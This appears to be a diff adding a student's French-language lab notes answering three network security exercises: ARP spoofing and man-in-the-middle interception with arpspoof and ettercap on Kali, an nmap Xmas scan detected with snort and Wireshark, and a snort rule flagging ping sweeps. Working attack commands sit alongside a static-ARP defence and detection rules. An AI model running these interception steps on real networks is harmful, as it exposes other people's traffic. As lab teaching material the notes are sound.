@@ -1,0 +1,37 @@
+Q1 :
+Faire ping sur tout les machine vers tout le monde :
+puis faire arp -n (voir association mac adresse) partout :
+install net-tools pour la commande arp -n 
+
+VM KALI
+apt install dsniff
+Activer le routage nano /sysctl.conf ipv4_forward=1
+puis sysctl -p
+puis faire et laisser tourner la commande:
+arpspoof -i eth0 <IP_VICTIME> <IP_routeur>
+
+refaire arp-n sur la victime on voit mac address changer.
+
+Une fois sa fait on fait la commande suivante : Ettercap -T -M arp :remote //// et on laisse tourner, on peut voir avec wireshark les données transférer.
+Aller sur la victime sur navigateur neverssl.com on voie les communications en http wireshark sur kali
+
+Pour éviter les deux attaques nous devons faire sur la cliente:
+Arp -s <IP_ROUTEUR> <MAC ROUTEUR>
+
+Q2:
+FW:
+sudo snort -A console -q -c /etc/snort/snort.conf -i [enp0s3]
+Lancer wireshark sur FW avec le filtre suivant :
+tcp.flags.fin == 1 && tcp.flags.urg == 1 && tcp.flags.push == 1
+
+Depuis Kali Linux :
+nmap -sX 192.168.1.1
+
+Q3 :
+Firewall :
+nano /etc/snort/rules/local.rules
+alert icmp any any -> any any (msg:"Possible Ping Sweep"; detection_filter:track by_src, count 20, seconds 30; sid:1000021;)
+Puis faire :
+sudo snort -A console -q -c /etc/snort/snort.conf -i [enp0s3]
+
+Et tu fais un ping depuis la kali.
